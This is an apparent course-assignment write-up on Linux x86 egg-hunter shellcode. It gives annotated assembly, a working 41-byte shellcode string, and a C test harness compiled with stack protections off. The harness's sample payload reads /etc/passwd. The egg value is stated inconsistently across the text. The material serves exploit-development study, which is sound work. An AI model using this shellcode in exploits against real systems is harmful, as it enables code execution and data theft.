# Project 3: Egg hunter

- Study about the Egg Hunter shellcode
- Create a working demo of the Egghunter
- Should be configurable for different payloads




# What is an egg hunter?

A really good blog post by a previous student [H0mbre](https://h0mbre.github.io/SLAE_Egg_Hunter/) does a really great job consolidating information on egg hunters. Of note, he mentions [this paper](http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf) which defines a few techniques for writing an egg hunter. When searching egg hunters online, you will see a lot of examples using the [access()](https://man7.org/linux/man-pages/man2/access.2.html) method check for validating linux pages of memory that are readable such as [this one](https://rastating.github.io/creating-an-egg-hunter/) by rastating and another on [infosecwriteups](https://infosecwriteups.com/expdev-egghunter-linux-implementation-49154ff4d225) by bigb0ss. Conversely, only a few egg hunters using the `sigcheck()` method to check for valid memory without receiving SIGSEGV signal. That said, I did find one example of it's use by [mmquant](https://mmquant.net/egg-hunters-on-linux/#egghunter_example_sigaction). I mention this to point out a few techniques for finding eggs without throwing exceptions from trying to read memory in inaccessable addresses.

In short, an egg hunter is a two stage payload when you have limited buffer space for your overflow. If you can insert the main payload somewhere in memory, you can use a small egg hunter to search for that main payload and execute it. For more specific details, please refer to the links above. 

For this assignment I will walk through the `access()` egg hunter methodology. I will use the egg `"cd0e" or 0x65643063 (little endian)` as it seems [epi](https://epi052.gitlab.io/notes-to-self/blog/2020-05-18-osce-exam-practice-part-three/#mona-py-egg) has found it to work better than some other eggs such as `"W00T"` and it's a bit funner than random characters.


# Egg Hunter Assembly 

After playing with H0mbre's code as a means of learning, I wanted to change the assembly a bit so it's not a copy paste. That said, the assembly is pretty much the basic method of doing an `access()` egg hunter. I also didn't want to insert a bunch of junk statements just to make the assembly different. Thus, I only made a couple changes.

The first change was to replace the `mov ebx, <egg>` with `mov esi, <egg>`. Thus, I now store my egg in the `esi` regsiter instead of `ebx`. Because of this, I was able to remove the `pushad` and `popad` instructions as a means of saving registers since my egg was not constantly overwritten with the first argument of the access() call. 

Now that the `pushad/popad` instructions are removed, the only register that keeps getting overwritten is `eax` which holds the return value of the access() call. Usuall 0xfffffff2 or 0xfffffffb. To remedy this, I changed the `mov al, 0x21` to a `push 0x21; pop eax`. This will not add null bytes to my assembly and will effectively reset the eax register with the proper value. 

These changes result in a shellcode that is 1 byte less than the original. 

However, this shellcode did not work. After some debugging, the rather obvious answer appeared. The shellcode eventually jumps to the address in `edx` which holds our egg. What I need to do is jump past the egg to the actual instructions to execute. To do this, a simple `add edx, 0x8` is inserted right before `jmp edx` and the shellcode executes flawlessly. 

Since I want the egg to be `c0d3`, I make the egg stored in register `esi` set to `0x33643063` (3d0c)... which is `c0d3 | 0x63306433` in little endian.

The final assembly is as follows:

```x86asm
global _start

section .text
_start:
    mov esi, 0x33643063	; egg ("c0d3"), backwards in little endian = "3d0c" = 0x33643063
    xor ecx, ecx		
    mul ecx             ; set eax and edx to 0

page_forward:		    ; here, we're going to design a function of what to do if we get an EFAULT error
    or dx, 0xfff		; doing a bitwise logical OR against the $dx value
                        ; dx=4095 ; 0x1000 - 1 (4095) ; Page sizes in Linux x86 = 4096

address_check:		    ; here we're going to design a function to check the next 8 bytes of mem
    inc edx			    ; gets $edx to a nice multiple of 4096
    lea ebx, [edx+4]	; load [edx+4] to check if this fresh page is readable by us
    push 0x21		; access()
    pop eax
    int 0x80

    cmp al, 0xf2		; does the low-end of $eax equal 0xf2? did we get an EFAULT? 
    jz page_forward		; if we got an EFAULT, this page is unreadable, time to go to the next page!

    cmp [edx], esi		; is what is stored at the address of $edx our egg (0x65643063) ?
    jnz address_check	; if it's not, let's advance into the page and see if we can't find that pesky egg
    
    cmp [edx+4], esi	; we found our egg once, let's see if it's also in $edx + 4
    jnz address_check	; we found it once but not twice, have to keep looking
    
    add edx, 0x8        ; jump past our egg to our actual shellcode
    jmp edx			    ; we found it twice! go to edx (where our egg is) +8 and execute the code there! 
```


Shellcode (Length: 41 bytes):

```c
"\xbe\x63\x30\x64\x33\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee\x39\x32\x75\xef\x39\x72\x04\x75\xea\x83\xc2\x08\xff\xe2"
```

# Testing

To test, the shellcode can be executed with dynamic payloads using this egg_hunter_test.c program:

```c
#include <sys/mman.h>
#include <stdio.h>
#include <string.h>

unsigned char hunter[] = "\xbe\x63\x30\x64\x33\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee\x39\x32\x75\xef\x39\x72\x04\x75\xea\x83\xc2\x08\xff\xe2";
unsigned char code[] = "\x63\x30\x64\x33\x63\x30\x64\x33\x31\xc9\xf7\xe1\xb0\x05\x51\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe3\xcd\x80\x93\x91\xb0\x03\x66\xba\x01\x10\x4a\xcd\x80\x92\x29\xc0\xb0\x04\xb3\x01\xcd\x80\xb0\x01\xcd\x80";
	

int main(){
    printf("Hunter length: %d\n", strlen(hunter));
    printf("Shellcode length: %d\n", strlen(code));


    int r =  mprotect((void *)((int)hunter & ~4095),  4096, PROT_READ | PROT_WRITE|PROT_EXEC);
    printf("mprotect: %d\n",r);
    int (*ret)() = (int(*)())hunter;
    return ret();
    // return 1;
}
```

Of note is that the `code` variable can be any payload you want, just ensure it is prepended with the egg twice `\x63\x30\x64\x33\x63\x30\x64\x33` (c0d3c0d3).

Compile and run using 

```bash
gcc -fno-stack-protector -z execstack -m32 egg_hunter_test.c -o egg_hunter 
./egg_hunter
```